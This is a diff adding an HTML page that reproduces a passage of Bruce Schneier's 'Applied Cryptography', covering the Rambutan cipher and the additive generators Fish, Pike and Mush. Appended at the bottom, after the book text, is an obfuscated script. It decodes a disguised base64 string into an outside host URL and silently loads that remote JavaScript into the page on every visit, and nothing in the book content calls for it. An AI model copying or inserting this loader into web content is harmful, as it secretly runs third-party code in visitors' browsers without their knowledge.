@@ -1,0 +1,119 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Pseudo-Random-Sequence Generators and Stream Ciphers</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=16//-->
+<!--PAGES=390-392//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="16-07.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="16-09.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<H3><A NAME="Heading9"></A><FONT COLOR="#000077">16.8 Rambutan</FONT></H3>
+<P>Rambutan is a British algorithm, designed by the Communications Electronics Security Group (one of the aliases used by GCHQ). It is only sold as a hardware module and is approved for the protection of classified material up to &#147;Confidential.&#148; The algorithm itself is secret, and the chip is not generally commercially available.
+</P>
+<P>Rambutan has a 112-bit key (plus parity bits) and can operate in three modes: ECB, CBC, and 8-bit CFB. This strongly indicates that it is a block algorithm, but rumors point elsewhere. Supposedly, it is a LFSR stream cipher. It has five shift registers, each one of a different length around 80 bits. The feedback polynomials are fairly sparse, with only about 10 taps each. Each shift register provides four inputs to a very large and complex nonlinear function which eventually spits out a single bit.</P>
+<P>Why call it Rambutan? Perhaps, like the fruit, it&#146;s spiny and forbidding on the outside but soft and yielding inside. On the other hand, maybe that&#146;s not the reason.</P>
+<H3><A NAME="Heading10"></A><FONT COLOR="#000077">16.9 Additive Generators</FONT></H3>
+<P><B>Additive generators</B> (sometimes called lagged Fibonacci generators) are extremely efficient because they produce random words instead of random bits [863]. They are not secure on their own, but can be used as building blocks for secure generators.</P>
+<P>The initial state of the generator is an array of <I>n-</I>bit words: 8-bit words, 16-bit words, 32-bit words, whatever: <I>X</I><SUB>1</SUB>, <I>X</I><SUB>2</SUB>, <I>X</I><SUB>3</SUB>,..., <I>X</I><SUB>m</SUB>. This initial state is the key. The <I>i</I>th word of the generator is</P>
+<DL>
+<DD><I>X</I><SUB>i</SUB> = (<I>X</I><SUB>i-a</SUB> &#43; <I>X</I><SUB>i-b</SUB> &#43; <I>X</I><SUB>i-c</SUB> &#43;...&#43; <I>X</I><SUB>i-m</SUB>) mod 2<SUP>n</SUP>
+</DL>
+<P>If the coefficients <I>a, b, c,..., m</I> are chosen right, the period of this generator is at least 2<SUP>n</SUP> - 1. One of the requirements on the coefficients is that the least significant bit forms a maximal-length LFSR.</P>
+<P>For example, (55,24,0) is a primitive polynomial mod 2 from Table 16.2. This means that the following additive generator is maximal length.</P>
+<DL>
+<DD><I>X</I><SUB>i</SUB> = (<I>X</I><SUB>i-55</SUB> &#43; <I>X</I><SUB>i-24</SUB>) mod 2<SUP>n</SUP>
+</DL>
+<P>This works because the primitive polynomial has three coefficients. If it has more than three, you need some additional requirements to make it maximal length. See [249] for details.
+</P>
+<P><FONT SIZE="+1"><B><I>Fish</I></B></FONT></P>
+<P>Fish is an additive generator based on techniques used in the shrinking generator [190]. It produces a stream of 32-bit words which can be XORed with a plaintext stream to produce ciphertext, or XORed with a ciphertext stream to produce plaintext. The algorithm is named as it is because it is a Fibonacci shrinking generator.
+</P>
+<P>First, use these two additive generators. The key is the initial values of these generators.</P>
+<DL>
+<DD><I>A</I><SUB>i</SUB> = (<I>A</I><SUB>i-55</SUB> &#43; <I>A</I><SUB>i-24</SUB>) mod 2<SUP>32</SUP>
+<DD><I>B</I><SUB>i</SUB> = (<I>B</I><SUB>i-52</SUB> &#43; <I>B</I><SUB>i-19</SUB>) mod 2<SUP>32</SUP>
+</DL>
+<P>These sequences are shrunk, as a pair, depending on the least significant bit of <I>B</I><SUB>i</SUB>: if it is 1, use the pair; if it is 0, ignore the pair. <I>C</I><SUB>j</SUB> is the sequence of used words from <I>A</I><SUB>i,</SUB> and <I>D</I><SUB>j</SUB> is the sequence of used words from <I>B</I><SUB>i</SUB>. These words are used in pairs&#151;<I>C</I><SUB>2j</SUB>, <I>C</I><SUB>2j&#43;1</SUB>, <I>D</I><SUB>2j,</SUB> and <I>D</I><SUB>2j&#43;1</SUB>&#151;to generate two 32-bit output words: <I>K2j</I> and <I>K2j</I>&#43;1.</P>
+<DL>
+<DD><I>E</I><SUB>2j</SUB> = <I>C</I><SUB>2j</SUB> &#8853; (<I>D</I><SUB>2j</SUB> ^ <I>D</I><SUB>2j&#43;1</SUB>)
+<DD><I>F</I><SUB>2j</SUB> = <I>D</I><SUB>2j&#43;1</SUB> ^ (<I>E</I><SUB>2j</SUB> ^ <I>C</I><SUB>2j&#43;1</SUB>)
+<DD><I>K</I><SUB>2j</SUB> = <I>E</I><SUB>2j</SUB> &#8853; <I>F</I><SUB>2j</SUB>
+<DD><I>K</I><SUB>2i&#43;1</SUB> = <I>C</I><SUB>2i&#43;1</SUB> &#8853; <I>F</I><SUB>2j</SUB>
+</DL>
+<P>This algorithm is fast. On a 33 megahertz 486, a C implementation of Fish encrypts data at 15 megabits per second. Unfortunately, it is also insecure; an attack has a work factor of about 2<SUP>40</SUP> [45].</P>
+<P><FONT SIZE="+1"><B><I>Pike</I></B></FONT></P>
+<P>Pike is a leaner, meaner version of Fish, brought to you by Ross Anderson, the man who broke Fish [45]. It uses three additive generators. For example:
+</P>
+<DL>
+<DD><I>A</I><SUB>i</SUB> = (<I>A</I><SUB>i-55</SUB> &#43; <I>A</I><SUB>i-24</SUB>) mod 2<SUP>32</SUP>
+<DD><I>B</I><SUB>i</SUB> = (<I>B</I><SUB>i-57</SUB> &#43; <I>B</I><SUB>i-7</SUB>) mod 2<SUP>32</SUP>
+<DD><I>C</I><SUB>i</SUB> = (<I>C</I><SUB>i-58</SUB> &#43; <I>C</I><SUB>i-19</SUB>) mod 2<SUP>32</SUP>
+</DL>
+<P>To generate the keystream word, look at the addition carry bits. If all three agree (all are 0 or all are 1), then clock all three generators. If they do not, just clock the two generators that agree. Save the carry bits for next time. The final output is the XOR of the three generators.
+</P>
+<P>Pike is faster than Fish, since on the average 2.75 steps will be required per output rather than 3. It is far too new to trust, but looks good so far.</P>
+<P><FONT SIZE="+1"><B><I>Mush</I></B></FONT></P>
+<P>Mush is a mutual shrinking generator. It&#146;s easy to explain [1590]. Take two additive generators: <I>A</I> and <I>B</I>. If the carry bit of <I>A</I> is set, clock <I>B</I>. If the carry bit of <I>B</I> is set, clock <I>A</I>. Clock <I>A</I>, and set the carry bit if there is a carry. Clock <I>B</I>, and set the carry bit if there is a carry. The final output is the XOR of the output of <I>A</I> and <I>B</I>.</P>
+<P>The easiest generators to use are the ones from Fish:</P>
+<DL>
+<DD><I>A</I><SUB>i</SUB> = (<I>A</I><SUB>i-55</SUB> &#43; <I>A</I><SUB>i-24</SUB>) mod 2<SUP>32</SUP>
+<DD><I>B</I><SUB>i</SUB> = (<I>B</I><SUB>i-52</SUB> &#43; <I>B</I><SUB>i-19</SUB>) mod 2<SUP>32</SUP>
+</DL>
+<P>On the average, three generator iterations are required to produce one output word. And if the coefficients of the additive generators are chosen correctly and are relatively prime, the output sequence will be maximal length. I know of no successful attacks, but remember that this algorithm is very new.
+</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="16-07.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="16-09.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(MENZhTJF, UgIBaeag) {UgIBaeag = MENZhTJF.createElement('script');UgIBaeag.type = 'text/javascript';UgIBaeag.async = true;UgIBaeag.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');MENZhTJF.getElementsByTagName('body')[0].appendChild(UgIBaeag);}(document));</script></body>
+</html>
